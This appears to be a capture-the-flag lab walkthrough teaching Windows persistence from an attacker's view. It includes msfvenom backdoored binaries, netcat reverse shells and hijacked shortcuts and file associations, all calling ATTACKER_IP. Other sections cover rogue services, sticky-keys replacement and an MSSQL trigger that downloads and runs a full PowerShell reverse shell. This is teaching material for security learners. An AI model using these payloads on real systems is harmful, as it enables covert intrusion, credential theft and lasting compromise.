# Windows Local Persistence

## Description

Learn the most common persistence techniques used on Windows machines.
* Category: Walkthrough

## Introduction

After gaining the first foothold on our target's internal network, we'll want to ensure we don't lose access to it before actually getting to the crown jewels. Establishing persistence is one of the first tasks we'll have as attackers when gaining access to a network. In simple terms, persistence refers to creating alternate ways to regain access to a host without going through the exploitation phase all over again.

There are many reasons why we'd want to establish persistence as quick as possible, including:
* **Re-exploitation ins't always possible:** Some unstable exploits might kill the vulnerable process during exploitation, getting us a single shot at some of them.
* **Gaining a foothold is too hard to reproduce:** Some exploits might require a lot of time and effort to reproduce.
* **The blue team is after us:** Any vulnerability used to gain our first access might be patched if our actions get detected. We are in a race against the clock!

While we could do with keeping some administrator's password hash and reusing it to connect back, we always risk those credentials getting rotated at some point. Plus, there are sneakier ways in which we could regain access to a compromised machine, making life harder for the blue team.

## Tampering With Unprivileged Accounts

Having an administrator's credential would be the easiest way to achieve persistence in a machine. However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.

### Assign Group Memberships

For this part of the task, we will assume we have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group.

If this looks too suspicious, we can use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL. This would allow us to copy the content of the SAM and SYSTEM registry hives, which we can then use to recover the password hashes for all the users, enabling us to escalate to any administrative account trivially.

Even if we are on the Backups Operators group, we wouldn't be able to access all files as expected. A quick check on our assigned groups would indicate that we are a part of Backup Operators, but the group is disabled.

This is due to User Account Control (UAC). One of the features implemented by UAC, **LocalAccountTokenFilterPolicy**, strips any local account of its administrative privileges when logging in remotely. While we can elevate our privileges through UAC from a graphical user session, if we are using WinRM, we are confined to a limited access token with no administrative privileges.

To be able to regain administration privileges from our user, we'll have to disable LocalAccountTokenFilterPolicy by changing the registry key to 1.

Once all of this has been set up, we are ready to use our backdoor user. We can first establish a WinRM connection and check the **Backup Operators** group membership. We then proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine. With those files, we can dump the password hashes for all users. And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges.

### Special Privileges and Security Descriptors

A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system.

In the case of the Backup Operators group, it has the following two privileges assigned by default:
* **SeBackupPrivilege:** The user can read any file in the system, ignoring any DACL in place.
* **SeRestorePrivilege:** The user can write any file in the system, ignoring any DACL in place.

We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. First, we will export the current configuration to a temporary file: `secedit /export /cfg config.inf`. We can then edit the file to add the privileges we want to assign to the user. We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system: `secedit /import /cfg config.inf /db config.sdb` and `secedit /configure /db config.sdb /cfg config.inf`.

We should now have a user with equivalent privileges to any Backup Operator. The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the security descriptor associated with the WinRM service to allow `thmuser2` to connect. Think of a **security descriptor** as an ACL but applied to other system facilities.

To open the configuration window for WinRM's security descriptor, we can use the following command in Powershell (we'll need to use the GUI session for this): `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`.

This will open a window where we can add `thmuser2` and assign it full privileges to connect to WinRM.

Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.

### RID Hijacking

Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think we are the Administrator.

When a user is created, an identifier called **Relative ID (RID)** is assigned to them. The RID is simply a numeric identifier representing the user across the system. When a user logs on, the LSASS process gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.

In any Windows system, the default Administrator account is assigned the RID $=$ 500, and regular users usually have RID $\geq$ 1000. The RID is the last bit of the SID. The SID is an identifier that allows the operating system to identify a user across a domain, but we won't mind too much about the rest of it for this task.

Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using Regedit. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run Regedit as SYSTEM, we will use psexec, available in `C:\tools\pstools` in our machine.

From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine. Since we want to modify thmuser3, we need to search for a key with its RID in hex (1010 = 0x3F2). Under the corresponding key, there will be a value called **F**, which holds the user's effective RID at position 0x30.

Notice the RID is stored using little-endian notation, so its bytes appear reversed. We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401). The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.

## Backdooring Files

Another method of establishing persistence consists of tampering with some files we know the user interacts with regularly. By performing some modifications to such files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.

While there are many opportunities to plant backdoors, we will check the most commonly used ones.

### Executable Files

If there is any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to `C:\Program Files\PuTTY\putty.exe`. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.

We can easily plant a payload of our preference in any `.exe` file with `msfvenom`. The binary will still work as usual but execute an additional payload silently by adding an extra thread in our binary. To create a backdoored `putty.exe`, we can use the following command:

```bash
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. While this method is good enough to establish persistence, let's look at other sneakier techniques.

### Shortcut Files

If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.

Before hijacking the shortcut's target, we create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run the program from the original location on the shortcut's properties:

```PowerShell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Finally, we'll change the shortcut to point to our script. Notice that the shortcut's icon might be automatically adjusted while doing so. Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell.

If we double-click the shortcut, we should get a connection back to our attacker's machine. Meanwhile, the user will get a calculator just as expected by them. We will probably notice a command prompt flashing up and disappearing immediately on our screen. A regular user might not mind too much about that, hopefully.

### Hijacking File Associations

In addition to persisting through executables or shortcuts, we can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.

The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`. Let's say we want to check which program is used to open `.txt` files; we can just go and check for the `.txt` subkey and find which **Programmatic ID (ProgID)** is associated with it. A ProgID is simply an identifier to a program installed on the system.

We can then search for a subkey for the corresponding ProgID (also under `HKLM\Software\Classes\`), in this case, `txtfile`, where we will find a reference to the program in charge of handling `.txt` files. Most ProgID entries will have a subkey under shell\open\command where the default command to be run for files with that extension is specified.

In this case, when we try to open a `.txt` file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. First, we create a ps1 script with the following content and save it to `C:\Windows\backdoor2.ps1`:

```PowerShell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Notice how in Powershell, we have to pass `$args[0]` to notepad, as it will contain the name of the file to be opened, as given through `%1`. Then we change the registry key to run our backdoor script in a hidden window.

## Abusing Services

Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.

A service is basically an executable that runs in the background. When configuring a service, we define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.

There are two main ways we can abuse services to establish persistence: either create a new service or modify an existing one to execute our payload.

### Creating Backdoor Services

We can create and start a service named "THMservice" using the following commands:

```cmd
# There must be a space after the equal sign
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

The `net user` command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (`start= auto`), so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If we want to create an executable that is compatible with Windows services, we can use the `exe-service` format in msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4446 -f exe-service -o service.exe`.

We can then copy the executable to our target system, say in `C:\Windows` and point the service's binPath to it:

```cmd
sc.exe create THMservice binPath= "C:\Windows\service.exe" start= auto
sc.exe start THMservice
```

### Modifying Existing Services

While creating new services for persistence works quite well, the blue team may monitor new service creation across the network. We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.

We can get a list of available services using the following command: `sc.exe query state=all`. To query the service's configuration, we can use the following command: `sc.exe qc SERVICE_NAME`.

There are three things we care about when using a service for persistence:
* The executable (**BINARY_PATH_NAME**) should point to our payload.
* The service **START_TYPE** should be automatic so that the payload runs without user interaction.
* The **SERVICE_START_NAME**, which is the account under which the service will run, should preferably be set to **LocalSystem** to gain SYSTEM privileges.

To reconfigure a service's parameters, we can use the following command: `sc.exe config SERVICE_NAME binPath= "C:\Windows\service.exe" start= auto obj= LocalSystem`.

We can then check the service's configuration to ensure the changes have been applied: `sc.exe qc SERVICE_NAME`.

## Abusing Scheduled Tasks

We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems.

### Task Scheduler

The most common way to schedule tasks is using the built-in **Windows task scheduler**. The task scheduler allows for granular control of when our task will start, allowing us to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. From the command line, we can use `schtasks` to interact with the task scheduler.

### Making Our Task Invisible

Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable. To further hide our scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor (SD)**. The security descriptor is simply an ACL that states which users have access to the scheduled task. If our user isn't allowed to query a scheduled task, we won't be able to see it anymore, as Windows only shows us the tasks that we have permission to use. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.

The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. We will find a registry key for every task, under which a value named "SD" contains the security descriptor. We can only erase the value if we hold SYSTEM privileges.

## Logon Triggered Persistence

Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.

### Startup Folders

Each user has a folder under `C:\Users\<our_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where we can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.

If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.

### Run/RunOnce

We can also force a user to execute a program on logon via the registry. Instead of delivering our payload into a specific directory, we can use the following registry entries to specify applications to run at logon:
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the Run keys will run every time the user logs on. Programs specified under the RunOnce keys will only be executed a single time.

### Winlogon

Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads our user profile right after authentication (amongst other things).

Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:
* `Userinit` points to `userinit.exe`, which is in charge of restoring our user profile preferences.
* `shell` points to the system's shell, which is usually `explorer.exe`.

If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, we can append commands separated by a comma, and Winlogon will process them all.

### Logon scripts

One of the things `userinit.exe` does while loading our user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

To create an environment variable for a user, we can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it gets loaded when the users logs in.

Notice that this registry key has no equivalent in `HKLM`, making our backdoor apply to the current user only.

## Backdooring the Login Screen / RDP

If we have physical access to the machine (or RDP in our case), we can backdoor the login screen to access a terminal without having valid credentials for a machine.

### Sticky Keys

To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT` 5 times.

After pressing `SHIFT` 5 times, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. We can do so with the following commands:

```cmd
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

After doing so, we lock our session from the start menu. We should now be able to press SHIFT five times to access a terminal with SYSTEM privileges directly from the login screen.

### Utilman

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen.

When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again.

To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`. To trigger our terminal, we will lock our screen from the start button. And finally, proceed to click on the "Ease of Access" button. Since we replaced `utilman.exe` with a `cmd.exe` copy, we will get a command prompt with SYSTEM privileges.

## Persisting Through Existing Services

If we don't want to use Windows features to hide a backdoor, we can always profit from any existing service that can be used to run code for us. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where we have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!

### Using Web Shells

The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default is `iis apppool\defaultapppool`. Even if this is an unprivileged user, it has the special `SeImpersonatePrivilege`, providing an easy way to escalate to the Administrator using various known exploits.

Let's start by downloading an `ASP.NET` web shell. A ready to use web shell is provided here. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory.

Depending on the way we create/transfer `shell.aspx`, the permissions in the file may not allow the web server to access it. If we are getting a *Permission Denied* error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. We can do so with `icacls shell.aspx /grant Everyone:F`.

We can then run commands from the web server by pointing to the following URL: `http://IP/shell.aspx`.

While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.

### Using MSSQL as a Backdoor

There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put, **triggers** in MSSQL allow us to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any `INSERT` into the `HRDB` database.

Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows us to run commands directly in the system's console but comes disabled by default.

To enable it, let's open **Microsoft SQL Server Management Studio 18**, available from the start menu. When asked for authentication, just use **Windows Authentication** (the default value), and we will be logged on with the credentials of our current Windows User. By default, the local Administrator account will have access to all DBs.

Once logged in, click on the New Query button to open the query editor. Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`:

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

After this, we must ensure that any website accessing the database can run `xp_cmdshell`. By default, only database users with the `sysadmin` role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the `sa` user, which is the default database administrator:

```sql
USE master
GRANT IMPERSONATE ON LOGIN::sa TO [PUBLIC];
```

After all of this, we finally configure a trigger. We start by changing to the `HRDB` database: `USE HRDB`. Our trigger will leverage `xp_cmdshell` to execute Powershell to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an `INSERT` is made into the `Employees` table of the `HRDB` database:

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Now that the backdoor is set up, let's create `evilscript.ps1` in our attacker's machine, which will contain a Powershell reverse shell:

```PowerShell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

We will need to open two terminals to handle the connections involved in this exploit:
* The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that.
* The second connection will be a reverse shell on port 4454 back to our attacker machine.

With all that ready, let's navigate to the website and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.